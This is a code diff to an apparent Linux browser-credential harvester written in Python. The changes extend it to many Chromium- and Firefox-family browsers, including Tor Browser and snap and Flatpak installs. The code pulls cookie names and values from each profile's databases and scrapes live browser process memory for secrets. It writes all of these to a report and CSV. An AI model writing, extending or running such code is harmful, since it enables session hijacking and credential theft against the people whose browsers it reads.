@@ -331,21 +331,107 @@ def deduplicate(hits: list[dict]) -> list[dict]:
 
 
 # ── Browser config ─────────────────────────────────────────────────────────────
-BROWSERS = [
-    ("Google Chrome",  "chrome",     os.path.join(HOME, ".config", "google-chrome")),
-    ("Chromium",       "chromium",   os.path.join(HOME, ".config", "chromium")),
-    ("Brave",          "brave",      os.path.join(HOME, ".config", "BraveSoftware", "Brave-Browser")),
-    ("Microsoft Edge", "msedge",     os.path.join(HOME, ".config", "microsoft-edge")),
-    ("Vivaldi",        "vivaldi-bin",os.path.join(HOME, ".config", "vivaldi")),
-    ("Opera",          "opera",      os.path.join(HOME, ".config", "opera")),
-    ("Opera GX",       "opera",      os.path.join(HOME, ".config", "opera-gx")),
+# Each Chromium-based spec: (display_name, [process_names], [profile_path_candidates])
+# Paths are tried in order — first existing dir wins; otherwise the first path is used
+# so "Not installed" still appears in the report.
+# process_names[0] is the primary key; the rest are distro/snap aliases.
+_CHROMIUM_SPECS: list[tuple[str, list[str], list[str]]] = [
+    ("Google Chrome",
+     ["chrome", "google-chrome", "google-chrome-stable",
+      "google-chrome-beta", "google-chrome-unstable"],
+     [os.path.join(HOME, ".config", "google-chrome"),
+      os.path.join(HOME, "snap", "google-chrome", "current", ".config", "google-chrome"),
+      os.path.join(HOME, ".var", "app", "com.google.Chrome", "config", "google-chrome")]),
+
+    ("Chromium",
+     ["chromium", "chromium-browser", "chromium-freeworld"],
+     [os.path.join(HOME, ".config", "chromium"),
+      os.path.join(HOME, "snap", "chromium", "current", ".config", "chromium"),
+      os.path.join(HOME, ".var", "app", "org.chromium.Chromium", "config", "chromium")]),
+
+    ("Brave",
+     ["brave", "brave-browser", "brave-browser-stable"],
+     [os.path.join(HOME, ".config", "BraveSoftware", "Brave-Browser"),
+      os.path.join(HOME, "snap", "brave", "current", ".config", "BraveSoftware", "Brave-Browser"),
+      os.path.join(HOME, ".var", "app", "com.brave.Browser", "config", "BraveSoftware", "Brave-Browser")]),
+
+    ("Microsoft Edge",
+     ["msedge", "microsoft-edge", "microsoft-edge-stable",
+      "microsoft-edge-beta", "microsoft-edge-dev"],
+     [os.path.join(HOME, ".config", "microsoft-edge"),
+      os.path.join(HOME, ".config", "microsoft-edge-beta"),
+      os.path.join(HOME, ".config", "microsoft-edge-dev"),
+      os.path.join(HOME, "snap", "microsoft-edge", "current", ".config", "microsoft-edge"),
+      os.path.join(HOME, ".var", "app", "com.microsoft.Edge", "config", "microsoft-edge")]),
+
+    ("Vivaldi",
+     ["vivaldi", "vivaldi-stable", "vivaldi-bin"],
+     [os.path.join(HOME, ".config", "vivaldi"),
+      os.path.join(HOME, ".config", "vivaldi-snapshot"),
+      os.path.join(HOME, ".var", "app", "com.vivaldi.Vivaldi", "config", "vivaldi")]),
+
+    ("Opera",
+     ["opera", "opera-stable"],
+     [os.path.join(HOME, ".config", "opera"),
+      os.path.join(HOME, "snap", "opera", "current", ".config", "opera"),
+      os.path.join(HOME, ".var", "app", "com.opera.Opera", "config", "opera")]),
+
+    ("Opera GX",
+     ["opera-gx"],
+     [os.path.join(HOME, ".config", "opera-gx")]),
+
+    ("Yandex Browser",
+     ["yandex-browser", "yandex_browser"],
+     [os.path.join(HOME, ".config", "yandex-browser"),
+      os.path.join(HOME, ".config", "yandex-browser-beta")]),
 ]
 
-# Some browsers ship under alternate executable names across distros
+def _resolve_chromium_browsers() -> list[tuple[str, str, str]]:
+    result = []
+    for name, procs, paths in _CHROMIUM_SPECS:
+        resolved = next((p for p in paths if os.path.isdir(p)), paths[0])
+        result.append((name, procs[0], resolved))
+    return result
+
+BROWSERS = _resolve_chromium_browsers()
+
+# Maps primary process name → all known aliases (exe basename or comm)
 _CHROMIUM_ALT_NAMES: dict[str, list[str]] = {
-    "chromium":    ["chromium", "chromium-browser"],
-    "vivaldi-bin": ["vivaldi-bin", "vivaldi"],
+    procs[0]: procs for _, procs, _ in _CHROMIUM_SPECS
 }
+
+# Firefox-family specs: (display_name, [process_names], [profile_dir_candidates])
+# These use sqlite cookies.sqlite — no Chromium-style encryption.
+_FIREFOX_SPECS: list[tuple[str, list[str], list[str]]] = [
+    ("Firefox",
+     ["firefox", "firefox-esr", "firefox-bin"],
+     [os.path.join(HOME, ".mozilla", "firefox"),
+      os.path.join(HOME, "snap", "firefox", "common", ".mozilla", "firefox"),
+      os.path.join(HOME, ".var", "app", "org.mozilla.firefox", ".mozilla", "firefox")]),
+
+    ("Firefox ESR",
+     ["firefox-esr"],
+     [os.path.join(HOME, ".mozilla", "firefox")]),  # shares profile dir with Firefox
+
+    ("LibreWolf",
+     ["librewolf"],
+     [os.path.join(HOME, ".librewolf"),
+      os.path.join(HOME, "snap", "librewolf", "common", ".librewolf"),
+      os.path.join(HOME, ".var", "app", "io.gitlab.librewolf-community", ".librewolf")]),
+
+    ("Waterfox",
+     ["waterfox", "waterfox-current", "waterfox-classic"],
+     [os.path.join(HOME, ".waterfox"),
+      os.path.join(HOME, ".var", "app", "net.waterfox.waterfox", ".waterfox")]),
+
+    ("Tor Browser",
+     ["firefox", "tor-browser"],
+     [os.path.join(HOME, ".local", "share", "torbrowser", "tbb", "x86_64",
+                   "tor-browser_en-US", "Browser", "TorBrowser", "Data", "Browser"),
+      os.path.join(HOME, "tor-browser", "Browser", "TorBrowser", "Data", "Browser"),
+      os.path.join(HOME, ".local", "share", "torbrowser", "tbb", "x86_64",
+                   "tor-browser", "Browser", "TorBrowser", "Data", "Browser")]),
+]
 
 
 def _get_profiles(user_data_path: str) -> list[tuple[str, str]]:
@@ -409,11 +495,14 @@ _key_cache: dict[str, bytes] = {}
 
 def _app_name_for_path(user_data_path: str) -> str:
     p = user_data_path.lower()
-    if "brave" in p:        return "Brave"
-    if "chromium" in p:     return "Chromium"
-    if "microsoft-edge" in p or "msedge" in p: return "Microsoft Edge"
-    if "vivaldi" in p:      return "Vivaldi"
-    if "opera" in p:        return "Opera"
+    if "brave" in p:                                          return "Brave"
+    if "chromium" in p:                                       return "Chromium"
+    if "microsoft-edge" in p or "msedge" in p \
+            or "com.microsoft.edge" in p:                     return "Microsoft Edge"
+    if "vivaldi" in p:                                        return "Vivaldi"
+    if "opera-gx" in p:                                       return "Opera"
+    if "opera" in p or "com.opera" in p:                      return "Opera"
+    if "yandex" in p:                                         return "Yandex Browser"
     return "Chrome"
 
 
@@ -595,26 +684,20 @@ def extract_cookies(profile_path: str, key: bytes) -> list[dict]:
             shutil.rmtree(tmp_dir, ignore_errors=True)
 
 
-# ── Firefox cookie extraction ──────────────────────────────────────────────────
-def _firefox_profiles_dir() -> str | None:
-    """Return the Firefox profiles directory, checking standard and snap locations."""
-    candidates = [
-        os.path.join(HOME, ".mozilla", "firefox"),
-        os.path.join(HOME, "snap", "firefox", "common", ".mozilla", "firefox"),
-        os.path.join(HOME, ".var", "app", "org.mozilla.firefox", ".mozilla", "firefox"),  # Flatpak
-    ]
-    for path in candidates:
-        if os.path.isdir(path):
-            return path
-    return None
+# ── Firefox-family cookie extraction ──────────────────────────────────────────
+def _resolve_firefox_spec(spec_paths: list[str]) -> str | None:
+    """Return first existing profile directory from a Firefox-family spec path list."""
+    return next((p for p in spec_paths if os.path.isdir(p)), None)
 
 
-def extract_firefox_cookies_linux() -> list[dict]:
-    profiles_dir = _firefox_profiles_dir()
-    if not profiles_dir:
-        return []
+def _extract_moz_cookies(profiles_dir: str, browser_name: str) -> list[dict]:
+    """Extract cookies from all profiles in a Mozilla-style profiles directory."""
     results = []
-    for profile_name in os.listdir(profiles_dir):
+    try:
+        entries = os.listdir(profiles_dir)
+    except OSError:
+        return results
+    for profile_name in entries:
         db_path = os.path.join(profiles_dir, profile_name, "cookies.sqlite")
         if not os.path.exists(db_path):
             continue
@@ -630,6 +713,7 @@ def extract_firefox_cookies_linux() -> list[dict]:
                 for host, name, value, path, expiry, secure, httponly, samesite in rows:
                     samesite_str = {0: "None", 1: "Lax", 2: "Strict"}.get(samesite, str(samesite))
                     results.append({
+                        "browser": browser_name,
                         "profile": profile_name,
                         "host": host, "name": name, "value": value,
                         "path": path,
@@ -645,6 +729,26 @@ def extract_firefox_cookies_linux() -> list[dict]:
         finally:
             if tmp_dir:
                 shutil.rmtree(tmp_dir, ignore_errors=True)
+    return results
+
+
+def extract_all_firefox_family() -> list[tuple[str, list[str], str | None, list[dict]]]:
+    """
+    Returns one entry per Firefox-family browser spec:
+      (display_name, process_names, resolved_profiles_dir_or_None, cookies)
+    Deduplicates profile dirs so shared dirs (e.g. Firefox + Firefox ESR) are only
+    read once.
+    """
+    seen_dirs: set[str] = set()
+    results = []
+    for name, procs, paths in _FIREFOX_SPECS:
+        profiles_dir = _resolve_firefox_spec(paths)
+        if profiles_dir and profiles_dir in seen_dirs:
+            continue  # already extracted (e.g. Firefox ESR shares Firefox's dir)
+        cookies = _extract_moz_cookies(profiles_dir, name) if profiles_dir else []
+        if profiles_dir:
+            seen_dirs.add(profiles_dir)
+        results.append((name, procs, profiles_dir, cookies))
     return results
 
 
@@ -1604,13 +1708,18 @@ def main():
         if exists:
             lines.append(f"    path: {bpath}")
 
-    ff_dir = _firefox_profiles_dir()
-    ff_running = is_process_running("firefox")
-    ff_pids = find_pids("firefox")
-    ff_status = ("INSTALLED" if ff_dir else "not found") + ("  RUNNING (PIDs: " + ",".join(map(str, ff_pids)) + ")" if ff_running else "")
-    lines.append(f"  {'Firefox':<20} {ff_status}")
-    if ff_dir:
-        lines.append(f"    path: {ff_dir}")
+    for ff_name, ff_procs, ff_paths in _FIREFOX_SPECS:
+        ff_dir = _resolve_firefox_spec(ff_paths)
+        ff_pids_diag: list[int] = []
+        for pn in ff_procs:
+            ff_pids_diag.extend(find_pids(pn))
+        ff_pids_diag = list(set(ff_pids_diag))
+        ff_run_diag  = bool(ff_pids_diag)
+        status = ("INSTALLED" if ff_dir else "not found") + (
+            "  RUNNING (PIDs: " + ",".join(map(str, ff_pids_diag)) + ")" if ff_run_diag else "")
+        lines.append(f"  {ff_name:<20} {status}")
+        if ff_dir:
+            lines.append(f"    path: {ff_dir}")
 
     targets = BROWSERS
     if args.browser:
@@ -1640,18 +1749,32 @@ def main():
         lines.extend(browser_lines)
         all_csv_rows.extend(browser_csv)
 
-    # Firefox
-    lines.append("\n" + "=" * 70)
-    ff_running = is_process_running("firefox")
-    lines.append(f"  BROWSER: Firefox  [{'RUNNING' if ff_running else 'closed'}]")
-    lines.append("=" * 70)
+    # Firefox-family browsers (Firefox, LibreWolf, Waterfox, Tor Browser)
+    ff_family = extract_all_firefox_family()
 
-    if do_disk:
-        lines.append("\n  -- [DISK] Cookies --")
-        try:
-            ff_cookies = extract_firefox_cookies_linux()
+    # Collect all unique PIDs across Firefox-family processes for memory scraping
+    ff_all_pids: set[int] = set()
+    for _, ff_procs, _, _ in ff_family:
+        for pn in ff_procs:
+            ff_all_pids.update(find_pids(pn))
+    ff_all_pids_list = list(ff_all_pids)
+
+    for ff_name, ff_procs, ff_profiles_dir, ff_cookies in ff_family:
+        ff_pids = list(set(p for pn in ff_procs for p in find_pids(pn)))
+        ff_running = bool(ff_pids)
+
+        lines.append("\n" + "=" * 70)
+        lines.append(f"  BROWSER: {ff_name}  [{'RUNNING' if ff_running else 'closed'}]")
+        lines.append("=" * 70)
+
+        if not ff_profiles_dir:
+            lines.append("  [--] Not installed\n")
+            continue
+
+        if do_disk:
+            lines.append("\n  -- [DISK] Cookies --")
             if ff_cookies:
-                lines.append(f"[+] {len(ff_cookies)} Firefox cookie(s) across all profiles\n")
+                lines.append(f"[+] {len(ff_cookies)} cookie(s) across all profiles\n")
                 for ck in ff_cookies:
                     lines.append(f"  Profile:  {ck.get('profile', '?')}")
                     lines.append(f"  Host:     {ck['host']}")
@@ -1659,50 +1782,47 @@ def main():
                     lines.append(f"  Value:    {ck['value']}")
                     lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}  SameSite:{ck.get('samesite', '?')}\n")
                     all_csv_rows.append({
-                        "browser": "Firefox", "profile": ck.get("profile", "?"),
+                        "browser": ff_name, "profile": ck.get("profile", "?"),
                         "label": "Cookie", "service": ck["host"],
                         "value": f"{ck['name']}={ck['value']}", "address": ck["host"],
                     })
             else:
-                lines.append("  [--] Firefox not installed or no cookies found")
-        except Exception as e:
-            lines.append(f"  [-] Firefox error: {e}")
+                lines.append("  [-] No cookies found")
 
-    lines.append("\n  -- [MEMORY] Live Scrape --")
-    if not do_memory:
-        lines.append("  [--] Skipped (--disk-only)")
-    elif not ff_running:
-        lines.append("  [--] Firefox not running")
-    else:
-        ff_pids = list(set(find_pids("firefox")))
-        ff_hits: list[dict] = []
-        ff_errors: list[str] = []
-        with ThreadPoolExecutor(max_workers=min(len(ff_pids), 8)) as pool:
-            futures = {pool.submit(scrape_pid, pid, args.max_hits): pid for pid in ff_pids}
-            for future in as_completed(futures):
-                pid = futures[future]
-                try:
-                    ff_hits.extend(future.result())
-                except PermissionError as e:
-                    ff_errors.append(f"PID {pid}: {e}")
-                except Exception as e:
-                    ff_errors.append(f"PID {pid}: {e}")
-        for e in ff_errors:
-            lines.append(f"  [-] {e}")
-        unique_ff = deduplicate(ff_hits)
-        if not unique_ff:
-            lines.append("  [-] No hits found")
+        lines.append("\n  -- [MEMORY] Live Scrape --")
+        if not do_memory:
+            lines.append("  [--] Skipped (--disk-only)")
+        elif not ff_running:
+            lines.append("  [--] Browser not running")
         else:
-            lines.append(f"[+] {len(unique_ff)} unique hit(s)  (across {len(ff_pids)} PID(s))\n")
-            for h in unique_ff:
-                h["_svc"] = identify_service(h["label"], h["value"], h.get("context", b""))
-                val = _trunc(h["value"].replace("\n", "\\n").replace("\r", "\\r"))
-                lines.append(f"  {h['label'][:22]:<22}  {h['_svc'][:28]:<28}  {val}")
-                all_csv_rows.append({
-                    "browser": "Firefox", "profile": "(memory)",
-                    "label": h["label"], "service": h["_svc"],
-                    "value": h["value"], "address": h.get("address", ""),
-                })
+            ff_hits: list[dict] = []
+            ff_errors: list[str] = []
+            with ThreadPoolExecutor(max_workers=min(len(ff_pids), 8)) as pool:
+                futures = {pool.submit(scrape_pid, pid, args.max_hits): pid for pid in ff_pids}
+                for future in as_completed(futures):
+                    pid = futures[future]
+                    try:
+                        ff_hits.extend(future.result())
+                    except PermissionError as e:
+                        ff_errors.append(f"PID {pid}: {e}")
+                    except Exception as e:
+                        ff_errors.append(f"PID {pid}: {e}")
+            for e in ff_errors:
+                lines.append(f"  [-] {e}")
+            unique_ff = deduplicate(ff_hits)
+            if not unique_ff:
+                lines.append("  [-] No hits found")
+            else:
+                lines.append(f"[+] {len(unique_ff)} unique hit(s)  (across {len(ff_pids)} PID(s))\n")
+                for h in unique_ff:
+                    h["_svc"] = identify_service(h["label"], h["value"], h.get("context", b""))
+                    val = _trunc(h["value"].replace("\n", "\\n").replace("\r", "\\r"))
+                    lines.append(f"  {h['label'][:22]:<22}  {h['_svc'][:28]:<28}  {val}")
+                    all_csv_rows.append({
+                        "browser": ff_name, "profile": "(memory)",
+                        "label": h["label"], "service": h["_svc"],
+                        "value": h["value"], "address": h.get("address", ""),
+                    })
 
     report = "\n".join(lines)
 
